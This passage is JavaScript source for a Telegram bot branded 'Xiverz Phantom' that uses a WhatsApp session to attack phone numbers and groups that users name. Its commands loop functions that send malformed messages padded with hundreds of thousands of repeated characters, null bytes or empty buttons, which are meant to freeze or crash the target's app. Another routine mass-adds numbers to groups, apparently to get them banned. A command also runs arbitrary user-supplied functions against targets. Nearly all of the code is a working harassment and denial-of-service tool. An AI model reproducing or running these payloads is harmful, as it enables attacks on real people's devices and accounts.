      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
/* COMMAND BUG #4 */
bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xlite 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xlite
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

     for (let i = 0; i < 100; i++) {
         await XvZDelay(sock, target);
         await XvZDelayV1(sock, target);
         await sleep(3500);
         }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xlite
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
/* COMMAND BUG #5 */
bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xburn 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xburn
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;
  
  for (let i = 0; i < 60; i++) {
    await XvZiOS(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xburn
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

//=================== [ CASE BVG GB ] ===================//
/* COMMAND BUG #6 */
bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xslash 12×××@g.us`);
  let target = q.replace(/[^0-9]/g, '') + "@g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xslash
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await XvZGb(sock, target);
    awair XvZGbV1(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xslash
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
/* COMMAND BUG #7 */
bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xban 12×××@g.us`);
  let target = q.replace(/[^0-9]/g, '') + "@g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xban
✧ Status: Success
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 4; i++) {
    await XvZBanGb(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xban
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunc 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: videoUrl },
        {
          caption: `<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success</strong></blockqoute>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success</strong></blockqoute>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: videoUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// Function Bug WhatsApp
async function XvZDelay(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mimetype: "image/jpeg",
caption: "NandoX(CrB)",
fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
fileLength: "634893",
height: 1022,
width: 1080,
mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mediaKeyTimestamp: "1782643133",
jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
hasMediaAttachment: true
}
},
body: {
text: "\u0000",
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
}
}
async function XvZDelayV1(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mimetype: "image/jpeg",
caption: "XiverzPhantom",
fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
fileLength: "634893",
height: 1022,
width: 1080,
mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
mediaKeyTimestamp: "1782643133",
jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
hasMediaAttachment: true
}
},
body: {
text: "\u0000",
},
nativeFlowMessage: {
buttons: "[".repeat(500000),
}
}
}
}
}, { noSelfSync: true })
}
async function XvZDelayV2(sock, target) {
    for (let i = 0; i < 10; i++) {
        await sock.relayMessage(target, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [{
                            messageType: 7,
                            mapMetadata: {
                                centerLatitude: -999999,
                                centerLongitude: 99999,
                                latitudeDelta: 99999,
                                longitudeDelta: 99999,
                                annotations: [{
                                    annotationNumber: 1,
                                    latitude: -999999,
                                    longitude: 99999999,
                                    title: "\0".repeat(500000),
                                    body: "𑇂𑆵𑆴𑆿".repeat(500)
                                }, {
                                    annotationNumber: 1,
                                    latitude: -999999,
                                    longitude: 99999999,
                                    title: "🦠‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶>666" + "\0".repeat(5000),
                                    body: "𑇂𑆵𑆴𑆿".repeat(500)
                                }, {
                                    annotationNumber: 1,
                                    latitude: -999999,
                                    longitude: 99999999,
                                    title: "\0".repeat(500000),
                                    body: "\0".repeat(5000)
                                }]
                            }
                        }],
                        contextInfo: {
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "259786046210223@bot"
                            },
                            forwardOrigin: 4,
                            botMessageSharingInfo: {
                                botEntryPointOrigin: 1,
                                forwardScore: 99
                            }
                        }
                    }
                }
            }
        }, {
            isSecret: true
        });
    }
}
async function XvZFc(sock, target) {
  const BillyZyy = {
    groupMentionedMessage: {
      message: {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "XiverzPhantom"
                  },
                  nativeFlowMessage: {
                    extra: "\u3104",
                    buttons: "\u000F".repeat(20000),
                    extra1: "\u00DC".repeat(5555)
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, BillyZyy, {
  //  noSelf: true
  });
}
async function XvZFcV1(sock, target) {
  const plerLoe = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [
            {
              messageType: 2,
              messageText: "XiverzPhantom?" + "ꦾ".repeat(45000)
            }
          ],
          unifiedResponse: {
            data: Buffer.from("\u0000".repeat(45000)).toString("base64")
          },
          addonActionSection: {
            footerAction: {
              GenAIFooterActionPrimitive: {},
              type: "GenAIFooterActionPrimitive",
              label: "",
              icon: ""
            },
            actionList: Array.from({ length: 50 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [target]
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, plerLoe.message, {
    //noSelfSync: true,
    messageId: plerLoe.key.id
  });
}
async function XvZFcV2(sock, target) {
  const startTime = Date.now();
  const duration = 2 * 60 * 1000;

  while (Date.now() - startTime < duration) {

    const Obok = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " XvZ Team ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
              version: 3
            },
            contextInfo: {
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 2,
                  expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
                }
              }
            }
          }
        }
      }
    };

    const syudu = generateWAMessageFromContent(target, Obok, {});
    await sock.relayMessage(target, syudu.message, {
      messageId: syudu.key.id
    });

    await sleep(500);
    
    const Obek = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "XiverzPhantom¡!",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 499999 }, () => ({}))
            }
          }
        }
      }
    };

    const syunda = generateWAMessageFromContent(target, Obek, {});
    await sock.relayMessage(target, syunda.message, {
      messageId: syunda.key.id
    });

    await sleep(500);
    
    const Obem = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_info",
                  buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
                }
              ]
            }
          }
        }
      }
    };

    const jawahama = generateWAMessageFromContent(target, Obem, {});
    await sock.relayMessage(target, jawahama.message, {
      messageId: jawahama.key.id
    });

    await sleep(1000);
  }
}
async function XvZiOS(sock, target) {
    await sock.relayMessage('status@broadcast', {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "x",
                        inline_entities: ["{".repeat(90000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      statusJidList: [target]
  })
}
async function XvZBanGb(sock, groupJid) {
    if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
    }

    const targets = [
        "18188880008@s.whatsapp.net",
        "18188880009@s.whatsapp.net",
        "18188880010@s.whatsapp.net",
        "18188880011@s.whatsapp.net",
        "18188880012@s.whatsapp.net"
    ];
    const action = "add";
    const maxLoop = 10;

    for (let i = 0; i < maxLoop; i++) {
        for (let j = 0; j < targets.length; j++) {
            try {
                await sock.groupParticipantsUpdate(groupJid, [targets[j]], action);
                await sock.sendPresenceUpdate('composing', groupJid);
            } catch (err) {
                console.error('error:', err.message);
            }
        }
    }
}
async function XvZGb(sock, groupJid) {
const groupMetadata = await sock.groupMetadata(groupJid);
const members = groupMetadata.participants.map(p => p.id);

  const msg = generateWAMessageFromContent(groupJid, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "XiverzPhantom",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [9999999999999999999,9999999999999999999,9999999999999999999,9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
                     body: {
    
          text: "— Alpzzy.exe#/."
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: members,
            groupMentions: []
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(groupJid, msg.message, {
    messageId: msg.key.id
  });
}
async function XvZGbV1(sock, groupJid){
const Memek = generateWAMessageFromContent(groupJid, {
interactiveMessage: {
header: {
title: " Heksen - Jahat Ne",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
          fileLength: 999999999,
          pageCount: 1000,
          mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
          fileName: "billy.pdf",
          fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
          directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1779839963",
          thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
          thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
          thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
          jpegThumbnail: null,
          contextInfo: {},
          thumbnailHeight: 999,
          thumbnailWidth: 999
        }
      },
      body: {
        text: "AlpzzyOfficiaL¡!"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  }, {});

  await sock.relayMessage(groupJid, Memek.message, {
    messageId: Memek.key.id
  });
}
//end Func
tokenGate.then((tokenOk) => {
  if (tokenOk) {
    bot.launch();
  } else {
  }
});
